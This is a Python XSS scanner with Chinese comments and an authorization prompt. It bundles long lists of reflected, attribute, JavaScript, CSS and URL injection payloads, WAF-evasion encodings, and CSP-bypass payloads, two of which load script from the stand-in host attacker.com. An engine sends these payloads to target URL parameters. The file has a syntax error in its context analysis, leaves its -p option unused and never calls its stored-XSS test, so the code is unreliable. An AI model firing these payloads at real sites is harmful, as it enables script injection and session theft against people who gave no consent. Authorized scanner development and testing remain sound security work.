#!/usr/bin/env python3
"""
Purpose: XSS 漏洞自动化扫描器
         支持：反射型 XSS、存储型 XSS、DOM 型 XSS、CSP 绕过测试
Auth: 仅限授权使用 — 未经书面授权禁止对任何目标执行检测
Dependencies: requests, beautifulsoup4, colorama, html.parser
Usage:
    python xss_scanner.py -u "http://target/search?q=test" -p q
    python xss_scanner.py -u "http://target" --crawl --depth 2
"""

import argparse
import json
import logging
import re
import sys
import time
from dataclasses import dataclass, field
from enum import Enum
from typing import List, Optional, Set, Tuple
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse

import requests
from bs4 import BeautifulSoup


class XSSType(Enum):
    """XSS 类型"""
    REFLECTED = "reflected"
    STORED = "stored"
    DOM = "dom"


class ContextType(Enum):
    """注入上下文类型"""
    HTML_BODY = "html_body"
    HTML_ATTRIBUTE = "html_attribute"
    JAVASCRIPT = "javascript"
    CSS = "css"
    URL = "url"


@dataclass
class XSSResult:
    """XSS 检测结果"""
    url: str
    parameter: str
    xss_type: XSSType
    context: ContextType
    payload: str
    evidence: str = ""
    csp_bypass: bool = False
    browser_verified: bool = False


@dataclass
class ScanConfig:
    """扫描配置"""
    timeout: int = 10
    delay: float = 0.3
    level: int = 1                # 扫描深度 1-5
    verify_ssl: bool = False
    proxy: Optional[str] = None
    user_agent: str = "XSSScanner/1.0"
    crawl: bool = False
    crawl_depth: int = 1
    verify_payloads: bool = True   # 是否用浏览器验证


# ============================================================
# Payload 数据库
# ============================================================

# 基础 XSS payload — 用于快速检测
BASIC_PAYLOADS: List[str] = [
    # --- 基础标签注入 ---
    "<script>alert(1)</script>",
    "<script>alert(document.cookie)</script>",
    "<script>confirm(1)</script>",
    "<script>prompt(1)</script>",
    "<ScRiPt>alert(1)</ScRiPt>",  # 大小写绕过

    # --- 闭合标签注入 ---
    "><script>alert(1)</script>",
    "'><script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "'><script>alert(document.cookie)</script>",

    # --- 简短 payload ---
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<details open ontoggle=alert(1)>",

    # --- 事件处理器 ---
    "<img src=x onerror=alert(1)>",
    "<img src=1 onerror=alert(1)>",
    "<body onmouseover=alert(1)>",
    "<div onmousemove=alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    "<select onfocus=alert(1) autofocus><option>x</option></select>",
    "<textarea onfocus=alert(1) autofocus>x</textarea>",
    "<keygen onfocus=alert(1) autofocus>",
    "<video><source onerror=alert(1)>",
    "<audio src=x onerror=alert(1)>",

    # --- 伪协议 ---
    "javascript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
    "vbscript:alert(1)",

    # --- IE 特有 ---
    "<div style=width:expression(alert(1))>",
    "<xml id=x><x><C><![CDATA[<img src=x onerror=alert(1)>]]>",
]

# 按上下文分类的 payload
CONTEXT_PAYLOADS: dict = {
    ContextType.HTML_BODY: [
        # 直接注入到 HTML body 中
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<body onload=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<marquee onstart=alert(1)>",
        "<div style=animation:rotate 1s onanimationstart=alert(1)>",
    ],

    ContextType.HTML_ATTRIBUTE: [
        # 注入到 HTML 属性值中
        # 注意：先闭合属性，再注入 payload
        "><script>alert(1)</script>",
        "' onclick=alert(1)>",
        '" onmouseover=alert(1) ',
        "' autofocus onfocus=alert(1) //",
        '> <script>alert(1)</script> <a \'',
        "' onmouseenter=alert(1) '",
        "' onmouseleave=alert(1) '",
        "' ontoggle=alert(1) '",
        "' onerror=alert(1) src=x>",
        "' onfocus=alert(1) autofocus>",
        "' onblur=alert(1) autofocus>",
        "' href=javascript:alert(1)>",
        "' src=javascript:alert(1)>",
        "' data:text/html,<script>alert(1)</script>>",
        "' action=javascript:alert(1)>",
        "' formaction=javascript:alert(1)>",
        "' x=x href=javascript:alert(1)>",
    ],

    ContextType.JAVASCRIPT: [
        # 注入到 JavaScript 代码中
        # 需要闭合引号并执行代码
        "'-alert(1)-'",
        "';alert(1);//",
        '\";alert(1);//',
        "'-alert(1)//",
        '\"-alert(1)//',
        ";alert(1)//",
        "';alert(document.cookie);//",
        '\\";\\");};alert(1);function x(){}//',
        "';if(1)alert(1);//",
        '\";if(1)alert(1);//',
        "${alert(1)}",
        "`<script>alert(1)</script>`",
    ],

    ContextType.CSS: [
        # 注入到 CSS 中
        "/**/alert(1)/**/",
        "*{x:expression(alert(1))}",  # IE
        "*{-o-link:'javascript:alert(1)'}",
        "*{-o-link-source:'javascript:alert(1)'}",
        "*{-ms-accelerator:'javascript:alert(1)'}",
        "*{background:url('javascript:alert(1)')}",
        "@import url('javascript:alert(1)');",
        ":after{content:'<script>alert(1)</script>'}",
        "}</style><script>alert(1)</script><style>",
        "' /><script>alert(1)</script><style '",
    ],

    ContextType.URL: [
        # 注入到 URL 中（如 href、src、action）
        "javascript:alert(1)",
        "javascript://%0Aalert(1)",  # 换行绕过
        "javascript://%250Aalert(1)",  # 双重编码
        "data:text/html,<script>alert(1)</script>",
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
        "vbscript:alert(1)",
        "livescript:alert(1)",
    ],
}

# CSP 绕过 payload
CSP_BYPASS_PAYLOADS: List[str] = [
    # --- JSONP 绕过 (script-src 允许的情况下) ---
    "<script src=//attacker.com/callback?callback=alert></script>",
    "<script src=//cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.9/angular.min.js></script><div ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</div>",

    # --- Angular 模板注入（CSP 兼容模式） ---
    "<div ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</div>",
    "<div ng-app ng-csp>{{$on.constructor('alert(1)')()}}</div>",

    # --- Vue 模板注入 ---
    "<script src=//cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js></script><div id=app>{{constructor.constructor('alert(1)')()}}</div>",

    # --- DOM clobbering ---
    "<form id=x><input name=parentNode><input name=location><form><script>alert(x.location)</script>",
    "<a id=x href=javascript:alert(1)><a id=x name=location><script>alert(x.location)</script>",

    # --- iframe sandbox 绕过 ---
    "<iframe sandbox=allow-scripts srcdoc='<script>alert(1)</script>'></iframe>",
    "<iframe srcdoc='<script>alert(1)</script>'></iframe>",

    # --- base 标签劫持（改变相对路径基准） ---
    "<base href=javascript:alert(1)><a href=//>click</a>",
    "<base href=//attacker.com><script src=exploit.js></script>",

    # --- object 标签绕过 ---
    "<object data=javascript:alert(1)></object>",
    "<embed src=javascript:alert(1) type=image/svg+xml>",

    # --- meta 刷新绕过 ---
    "<meta http-equiv=refresh content='0;url=javascript:alert(1)'>",
    "<meta http-equiv=refresh content='0;url=data:text/html,<script>alert(1)</script>'>",

    # --- iframe postMessage 绕过 ---
    "<iframe srcdoc='<script>onmessage=e=>{if(e.data==\"pwn\")alert(1)}</script>'><script>setTimeout(()=>{frames[0].postMessage(\"pwn\",\"\")},500)</script>",
]

# DOM XSS sink-source 映射
DOM_SINKS: dict = {
    # 危险的接收器 (sinks) — 它们可能执行任意代码
    "document.write": {
        "sources": [
            "location.hash",
            "location.search",
            "location.pathname",
            "document.URL",
            "document.referrer",
            "document.cookie",
        ],
        "description": "直接写入 HTML，若 source 未过滤可导致 XSS",
    },
    "innerHTML": {
        "sources": [
            "location.hash",
            "location.search",
            "document.URL",
            "localStorage",
            "sessionStorage",
        ],
        "description": "覆盖元素内容，script 标签通常不执行但其他危险",
    },
    "outerHTML": {
        "sources": [
            "location.hash",
            "location.search",
        ],
        "description": "替换整个元素，可直接注入脚本",
    },
    "eval": {
        "sources": [
            "location.hash",
            "location.search",
            "postMessage.data",
            "localStorage",
            "sessionStorage",
        ],
        "description": "执行任意 JS 代码，最危险的 sink",
    },
    "Function": {
        "sources": [
            "location.hash",
            "postMessage.data",
            "localStorage",
        ],
        "description": "构造函数执行代码",
    },
    "setTimeout": {
        "sources": [
            "location.hash",
            "location.search",
        ],
        "description": "延迟执行代码",
    },
    "setInterval": {
        "sources": [
            "location.hash",
        ],
        "description": "循环执行代码",
    },
    "location.href": {
        "sources": [
            "location.hash",
            "location.search",
            "postMessage.data",
        ],
        "description": "可设置为 javascript: 伪协议",
    },
    "location.assign": {
        "sources": [
            "location.hash",
        ],
        "description": "可设置为 javascript: 伪协议",
    },
    "location.replace": {
        "sources": [
            "location.hash",
        ],
        "description": "可设置为 javascript: 伪协议",
    },
    "history.pushState": {
        "sources": [
            "postMessage.data",
        ],
        "description": "修改历史记录，可能影响 URL 解析",
    },
    "window.open": {
        "sources": [
            "location.hash",
            "postMessage.data",
        ],
        "description": "打开新窗口，可设置为 javascript: 伪协议",
    },
    "script.src": {
        "sources": [
            "location.hash",
            "location.search",
            "localStorage",
        ],
        "description": "动态加载外部脚本",
    },
    "script.innerHTML": {
        "sources": [
            "location.hash",
        ],
        "description": "直接注入代码到 script 标签",
    },
    "style.innerHTML": {
        "sources": [
            "location.hash",
        ],
        "description": "注入 CSS，IE 下可执行 expression",
    },
}

# WAF 绕过编码
ENCODING_TECHNIQUES: List[str] = [
    # --- HTML 实体编码 ---
    "&lt;script&gt;alert(1)&lt;/script&gt;",
    "&#60;script&#62;alert(1)&#60;/script&#62;",
    "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",

    # --- URL 编码 ---
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "%253Cscript%253Ealert(1)%253C/script%253E",  # 双重编码

    # --- Unicode 编码 ---
    "\\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E",
    "\\u0000\\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E",

    # --- 大小写混合 ---
    "<ScRiPt>alert(1)</ScRiPt>",
    "<sCrIpT>aLeRt(1)</sCrIpT>",
    "<SCRiPt>ALeRT(1)</SCRiPt>",

    # --- 标签内空格 ---
    "<script>alert(1)</script >",
    "<script   >alert(1)</script  >",
    "<img src=x onerror=alert(1) >",

    # --- 属性引号变体 ---
    "<img src=x onerror=alert(1)>",
    "<img src='x' onerror='alert(1)'>",
    "<img src=\"x\" onerror=\"alert(1)\">",
    "<img src=`x` onerror=`alert(1)`>",  # ES6 模板字符串

    # --- 双写绕过 ---
    "<<script>>alert(1)</</script>>",
    "<img src=x onerror=alalertrt(1)>",
    "<sCrriipt>aallerrtt(1)</sCrriipt>",

    # --- 注释混淆 ---
    "<script>alert(1)</script/!",
    "<script/*!*/>alert(1)</script/**!**/>",
    "<img src=x onerror=/*!*/alert(1)>",

    # --- 反引号绕过（Chrome 下某些情况） ---
    "<script>`alert(1)`</script>",
    "<img src=`x` onerror=`alert(1)`>",

    # --- 换行制表符绕过 ---
    "<img\\nsrc=x\\nonerror=alert(1)>",
    "<img\\tsrc=\\tx\\tonerror=\\talert(1)>",
    "<script>\\nalert(1)\\n</script>",

    # --- 零宽字符 ---
    "<img src=x onerror=al\\u200Bert(1)>",
    "<script>al\\u200Bert(1)</script>",

    # --- 自定义标签（某些浏览器）---
    "<xss>alert(1)</xss>",
    "<image src=x onerror=alert(1)>",
    "<animate attributeName=href values=javascript:alert(1)><a xlink:href=test>test</a></animate>",
]


class XSSScanner:
    """XSS 扫描器核心类"""

    def __init__(self, config: ScanConfig):
        self.config = config
        self.session = requests.Session()
        self.results: List[XSSResult] = []
        self.visited: Set[str] = set()
        self._setup_session()

    def _setup_session(self):
        """配置 HTTP 会话"""
        self.session.verify = self.config.verify_ssl
        self.session.headers.update({"User-Agent": self.config.user_agent})
        if self.config.proxy:
            self.session.proxies = {"http": self.config.proxy, "https": self.config.proxy}

    # ----------------------------------------------------------
    # 扫描引擎
    # ----------------------------------------------------------

    def scan_url(self, url: str, parameters: Optional[List[str]] = None) -> List[XSSResult]:
        """
        扫描指定 URL 的 XSS 漏洞

        Args:
            url: 目标 URL
            parameters: 指定参数名，None 则自动提取

        Returns:
            检测结果列表
        """
        logging.info(f"[*] 开始 XSS 扫描: {url}")

        # 提取参数
        if parameters is None:
            parameters = self._extract_parameters(url)
        if not parameters:
            logging.warning("[!] 未找到可测试参数")
            return self.results

        logging.info(f"[*] 发现 {len(parameters)} 个参数: {parameters}")

        # 爬虫模式
        if self.config.crawl:
            urls = self._crawl(url, self.config.crawl_depth)
            logging.info(f"[*] 爬取到 {len(urls)} 个 URL")
        else:
            urls = {url}

        # 检查 CSP 策略
        csp_info = self._check_csp(url)
        if csp_info.get("policy"):
            logging.info(f"[*] CSP 策略: {csp_info.get('summary', 'detected')}")

        # 对每个 URL 的每个参数进行测试
        for target_url in urls:
            for param in parameters:
                # 1. 反射检测 + 上下文分析
                has_reflection, context = self._detect_reflection(target_url, param, "xss_test_marker_12345")
                if not has_reflection:
                    logging.debug(f"[-] {target_url} 参数 {param} 未反射")
                    continue

                logging.info(f"[+] {target_url} 参数 {param} 反射成功, 上下文: {context.value if context else 'unknown'}")

                # 2. 测试反射型 XSS
                result = self._test_reflected_xss(target_url, param, context)
                if result:
                    self.results.append(result)
                    continue  # 已确认，跳过后续测试

                # 3. 尝试 WAF 绕过编码
                if self.config.level >= 2:
                    result = self._test_encoding_bypass(target_url, param, context)
                    if result:
                        self.results.append(result)
                        continue

                # 4. 尝试 CSP 绕过
                if self.config.level >= 3 and csp_info.get("has_csp"):
                    result = self._test_csp_bypass(target_url, param)
                    if result:
                        self.results.append(result)

            # 测试 DOM XSS（独立于参数）
            if self.config.level >= 2:
                dom_results = self._test_dom_xss(target_url)
                self.results.extend(dom_results)

        logging.info(f"[*] 扫描完成，发现 {len(self.results)} 个 XSS 漏洞")
        return self.results

    def _extract_parameters(self, url: str) -> List[str]:
        """从 URL 中提取参数名"""
        parsed = urlparse(url)
        params = list(parse_qs(parsed.query).keys())
        return params

    def _detect_reflection(self, url: str, param: str, value: str) -> Tuple[bool, Optional[ContextType]]:
        """检测参数值是否在响应中反射，并确定上下文"""
        resp = self._send_with_param(url, param, value)
        if resp is None:
            return False, None

        if value in resp.text:
            context = self._analyze_context(resp.text, value)
            return True, context
        return False, None

    def _test_reflected_xss(self, url: str, param: str, context: Optional[ContextType]) -> Optional[XSSResult]:
        """测试反射型 XSS"""
        # 根据上下文选择 payload
        if context and context in CONTEXT_PAYLOADS:
            payloads = CONTEXT_PAYLOADS[context]
        else:
            payloads = BASIC_PAYLOADS

        for payload in payloads:
            resp = self._send_with_param(url, param, payload)
            if resp is None:
                continue

            # 检查 payload 是否在响应中（未被过滤/编码）
            if self._is_payload_reflected(resp.text, payload):
                # 检查 HTML 结构是否完整（标签未被破坏）
                if self._is_xss_triggerable(payload, resp.text):
                    logging.info(f"[+] 反射型 XSS 确认! payload: {payload[:60]}...")
                    return XSSResult(
                        url=url,
                        parameter=param,
                        xss_type=XSSType.REFLECTED,
                        context=context or ContextType.HTML_BODY,
                        payload=payload,
                        evidence=f"Payload reflected unescaped in {context.value if context else 'unknown'} context",
                    )
            time.sleep(self.config.delay)

        return None

    def _test_encoding_bypass(self, url: str, param: str, context: Optional[ContextType]) -> Optional[XSSResult]:
        """测试 WAF 绕过编码 payload"""
        logging.info(f"[*] 尝试编码绕过...")
        for payload in ENCODING_TECHNIQUES:
            resp = self._send_with_param(url, param, payload)
            if resp and self._is_payload_reflected(resp.text, payload):
                if self._is_xss_triggerable(payload, resp.text):
                    logging.info(f"[+] 编码绕过 XSS 确认! payload: {payload[:60]}...")
                    return XSSResult(
                        url=url,
                        parameter=param,
                        xss_type=XSSType.REFLECTED,
                        context=context or ContextType.HTML_BODY,
                        payload=payload,
                        evidence="Payload bypassed WAF via encoding",
                    )
            time.sleep(self.config.delay)
        return None

    def _test_csp_bypass(self, url: str, param: str) -> Optional[XSSResult]:
        """测试 CSP 绕过 payload"""
        logging.info(f"[*] 尝试 CSP 绕过...")
        for payload in CSP_BYPASS_PAYLOADS:
            resp = self._send_with_param(url, param, payload)
            if resp and self._is_payload_reflected(resp.text, payload):
                logging.info(f"[+] CSP 绕过 XSS 确认! payload: {payload[:60]}...")
                return XSSResult(
                    url=url,
                    parameter=param,
                    xss_type=XSSType.REFLECTED,
                    context=ContextType.HTML_BODY,
                    payload=payload,
                    evidence="Payload reflected, may bypass CSP",
                    csp_bypass=True,
                )
            time.sleep(self.config.delay)
        return None

    def _test_stored_xss(self, url: str, param: str) -> Optional[XSSResult]:
        """测试存储型 XSS"""
        # 存储型 XSS 需要两步：先提交 payload，再访问展示页面
        # 这是一个框架实现，实际使用需根据目标定制
        logging.info(f"[*] 测试存储型 XSS: {url} 参数 {param}")

        marker = "xss_stored_marker_abc123"
        payload = f"<script>{marker}</script>"

        # Step 1: 提交 payload
        resp = self._send_with_param(url, param, payload)
        if resp is None:
            return None

        # Step 2: 重新访问页面（GET 请求，不带 payload）检查是否存储
        time.sleep(1)
        parsed = urlparse(url)
        clean_url = urlunparse(parsed._replace(query=""))
        check_resp = self.session.get(clean_url, timeout=self.config.timeout, verify=self.config.verify_ssl)

        if check_resp and marker in check_resp.text:
            logging.info(f"[+] 存储型 XSS 确认!")
            return XSSResult(
                url=url,
                parameter=param,
                xss_type=XSSType.STORED,
                context=ContextType.HTML_BODY,
                payload=payload,
                evidence=f"Marker persisted and found on {clean_url}",
            )
        return None

    def _test_dom_xss(self, url: str) -> List[XSSResult]:
        """测试 DOM 型 XSS"""
        results = []
        logging.info(f"[*] 测试 DOM XSS: {url}")

        try:
            resp = self.session.get(url, timeout=self.config.timeout, verify=self.config.verify_ssl)
        except requests.RequestException:
            return results

        if not resp.text:
            return results

        # 提取页面中的 script 标签内容
        soup = BeautifulSoup(resp.text, "html.parser")
        scripts = soup.find_all("script")

        for script in scripts:
            js_code = script.string or ""
            if not js_code:
                continue

            # 检查是否存在危险 sink
            for sink_name, sink_info in DOM_SINKS.items():
                if sink_name in js_code:
                    # 检查是否有对应的 source
                    for source in sink_info.get("sources", []):
                        if source in js_code:
                            logging.info(f"[+] DOM XSS 疑似发现! sink={sink_name}, source={source}")
                            # 构造 hash payload 测试
                            test_url = f"{url}#<img src=x onerror=alert(1)>"
                            results.append(XSSResult(
                                url=url,
                                parameter="URL hash (DOM)",
                                xss_type=XSSType.DOM,
                                context=ContextType.HTML_BODY,
                                payload=f"#{'<img src=x onerror=alert(1)>'}",
                                evidence=f"DOM sink-source: {sink_name} <- {source}",
                            ))
                            break  # 一个 sink 匹配就够了
                    break  # 避免重复报告同一个 sink

        return results

    def _check_csp(self, url: str) -> dict:
        """分析目标 CSP 策略，评估绕过可能性"""
        result = {"has_csp": False, "policy": {}, "summary": "", "bypassable": False}
        try:
            resp = self.session.get(url, timeout=self.config.timeout, verify=self.config.verify_ssl)
        except requests.RequestException:
            return result

        csp_header = resp.headers.get("Content-Security-Policy", "")
        if not csp_header:
            return result

        result["has_csp"] = True
        result["policy"]["raw"] = csp_header

        # 解析 CSP 指令
        directives = {}
        for part in csp_header.split(";"):
            part = part.strip()
            if not part:
                continue
            tokens = part.split()
            if tokens:
                directives[tokens[0]] = tokens[1:]

        result["policy"]["directives"] = directives

        # 评估绕过可能性
        script_src = directives.get("script-src", [])
        if not script_src and "default-src" not in directives:
            result["bypassable"] = True
            result["summary"] = "No script-src or default-src"
        elif "unsafe-inline" in script_src or "unsafe-eval" in script_src:
            result["bypassable"] = True
            result["summary"] = "unsafe-inline/eval present"
        elif any("*" in s for s in script_src):
            result["bypassable"] = True
            result["summary"] = "Wildcard in script-src"
        else:
            result["summary"] = f"script-src: {', '.join(script_src[:3])}"

        return result

    def _analyze_context(self, html: str, reflection: str) -> ContextType:
        """分析反射值的上下文位置"""
        idx = html.find(reflection)
        if idx == -1:
            return ContextType.HTML_BODY

        # 检查是否在 <script> 标签内
        before = html[:idx]
        script_open = before.rfind("<script")
        script_close = before.rfind("</script>")
        if script_open > script_close:
            return ContextType.JAVASCRIPT

        # 检查是否在 <style> 标签内
        style_open = before.rfind("<style")
        style_close = before.rfind("</style>")
        if style_open > style_close:
            return ContextType.CSS

        # 检查是否在 HTML 属性中
        # 向前找最近的标签开始
        tag_start = before.rfind("<")
        tag_end = before.rfind">")
        if tag_start > tag_end:
            # 在标签属性中
            tag_content = before[tag_start:]
            if re.search(r'\b(?:href|src|action)\s*=', tag_content, re.IGNORECASE):
                return ContextType.URL
            return ContextType.HTML_ATTRIBUTE

        return ContextType.HTML_BODY

    def _crawl(self, base_url: str, depth: int) -> Set[str]:
        """爬取目标站点，收集带参数的 URL"""
        if depth <= 0 or base_url in self.visited:
            return set()

        self.visited.add(base_url)
        urls_with_params = set()

        try:
            resp = self.session.get(base_url, timeout=self.config.timeout, verify=self.config.verify_ssl)
        except requests.RequestException:
            return urls_with_params

        if not resp.text:
            return urls_with_params

        soup = BeautifulSoup(resp.text, "html.parser")

        # 提取链接
        for tag in soup.find_all(["a"], href=True):
            href = tag["href"]
            full_url = urljoin(base_url, href)
            parsed = urlparse(full_url)
            # 只收集同域名且带参数的 URL
            if parsed.query and parsed.netloc == urlparse(base_url).netloc:
                urls_with_params.add(full_url)
            elif depth > 1 and parsed.netloc == urlparse(base_url).netloc:
                urls_with_params.update(self._crawl(full_url, depth - 1))

        # 提取表单
        for form in soup.find_all("form"):
            action = form.get("action", "")
            method = form.get("method", "GET").upper()
            form_url = urljoin(base_url, action)
            inputs = form.find_all(["input", "textarea", "select"])
            for inp in inputs:
                name = inp.get("name")
                if name:
                    urls_with_params.add(f"{form_url}?__form_param__={name}&__form_method__={method}")

        return urls_with_params

    # ----------------------------------------------------------
    # 辅助方法
    # ----------------------------------------------------------

    def _send_with_param(self, url: str, param: str, value: str) -> Optional[requests.Response]:
        """发送带参数值的请求"""
        time.sleep(self.config.delay)
        try:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            params[param] = [value]
            new_query = urlencode(params, doseq=True)
            new_url = urlunparse(parsed._replace(query=new_query))
            return self.session.get(new_url, timeout=self.config.timeout)
        except requests.RequestException as e:
            logging.debug(f"Request failed: {e}")
            return None

    def _is_payload_reflected(self, text: str, payload: str) -> bool:
        """检查 payload 是否在响应中反射（未被完全过滤）"""
        # 检查 payload 的关键部分是否出现
        # 简化：直接字符串匹配 + 关键标签匹配
        if payload in text:
            return True
        # 检查核心标签是否保留（即使部分属性被过滤）
        core_patterns = [
            r"<script", r"<img", r"<svg", r"<iframe", r"<body",
            r"onerror\s*=", r"onload\s*=", r"onfocus\s*=",
            r"javascript:",
        ]
        for pattern in core_patterns:
            if re.search(pattern, text, re.IGNORECASE) and re.search(pattern, payload, re.IGNORECASE):
                # 确保匹配位置在反射点附近
                if payload.lower()[:20] in text.lower():
                    return True
        return False

    def _is_xss_triggerable(self, payload: str, response_text: str) -> bool:
        """检查 XSS payload 在响应中是否可触发（HTML 结构完整）"""
        # 检查标签是否完整闭合
        if payload in response_text:
            # 检查是否有开始和结束标签
            for tag in ["script", "img", "svg", "iframe", "body", "details", "video", "audio"]:
                if f"<{tag}" in payload.lower():
                    # 对于自闭合标签（img, svg 等），只要开始标签在响应中即可
                    if tag in ("img", "svg", "input", "details"):
                        return True
                    # 对于需要闭合的标签（script 等），检查结束标签
                    if f"</{tag}" in response_text.lower() or "/>" in response_text:
                        return True
            # 事件处理器型 payload
            if any(evt in payload.lower() for evt in ["onerror", "onload", "onfocus", "onclick", "ontoggle"]):
                return True
            # javascript: 伪协议
            if "javascript:" in payload.lower() and "javascript:" in response_text.lower():
                return True
        return False

    # ----------------------------------------------------------
    # 输出与报告
    # ----------------------------------------------------------

    def print_results(self):
        """格式化输出检测结果"""
        if not self.results:
            print("\n[-] 未发现 XSS 漏洞")
            return

        print(f"\n{'='*60}")
        print("  XSS 漏洞检测报告")
        print(f"{'='*60}")
        for i, r in enumerate(self.results, 1):
            print(f"\n  [{i}] {r.xss_type.value.upper()} XSS")
            print(f"  上下文: {r.context.value}")
            print(f"  参数: {r.parameter}")
            print(f"  Payload: {r.payload[:80]}{'...' if len(r.payload)>80 else ''}")
            if r.evidence:
                print(f"  证据: {r.evidence}")
            if r.csp_bypass:
                print(f"  CSP 绕过: 是")
        print(f"\n{'='*60}")

    def export_report(self, filepath: str):
        """导出检测报告"""
        import json
        data = {
            "results": [
                {
                    "url": r.url,
                    "parameter": r.parameter,
                    "type": r.xss_type.value,
                    "context": r.context.value,
                    "payload": r.payload,
                    "evidence": r.evidence,
                    "csp_bypass": r.csp_bypass,
                }
                for r in self.results
            ]
        }
        if filepath.endswith(".json"):
            with open(filepath, "w", encoding="utf-8") as f:
                json.dump(data, f, ensure_ascii=False, indent=2)
        elif filepath.endswith(".md"):
            lines = ["# XSS Scan Report\n"]
            for i, r in enumerate(self.results, 1):
                lines.append(f"## Finding {i}: {r.xss_type.value.upper()} XSS")
                lines.append(f"- **URL**: {r.url}")
                lines.append(f"- **Parameter**: `{r.parameter}`")
                lines.append(f"- **Context**: {r.context.value}")
                lines.append(f"- **Payload**: `{r.payload[:100]}`")
                lines.append(f"- **Evidence**: {r.evidence}")
                lines.append("")
            with open(filepath, "w", encoding="utf-8") as f:
                f.write("\n".join(lines))
        logging.info(f"[+] 报告已导出: {filepath}")


def main():
    parser = argparse.ArgumentParser(
        description="XSS 漏洞自动化扫描器（仅限授权使用）",
        epilog="⚠️  未经授权使用本工具属于违法行为"
    )
    parser.add_argument("-u", "--url", required=True, help="目标 URL")
    parser.add_argument("-p", "--parameter", help="指定测试参数")
    parser.add_argument("--crawl", action="store_true", help="启用爬虫模式")
    parser.add_argument("--depth", type=int, default=1, help="爬取深度")
    parser.add_argument("--level", type=int, default=1, choices=range(1, 6))
    parser.add_argument("--proxy", help="代理地址")
    parser.add_argument("-o", "--output", help="输出报告路径")

    args = parser.parse_args()

    print("⚠️  请确认你已获得目标系统的书面授权")
    confirm = input("确认已获授权？(y/N): ")
    if confirm.lower() != "y":
        sys.exit(0)

    config = ScanConfig(
        crawl=args.crawl,
        crawl_depth=args.depth,
        level=args.level,
        proxy=args.proxy,
    )
    scanner = XSSScanner(config)
    results = scanner.scan_url(args.url)
    scanner.print_results()

    if args.output:
        scanner.export_report(args.output)


if __name__ == "__main__":
    main()
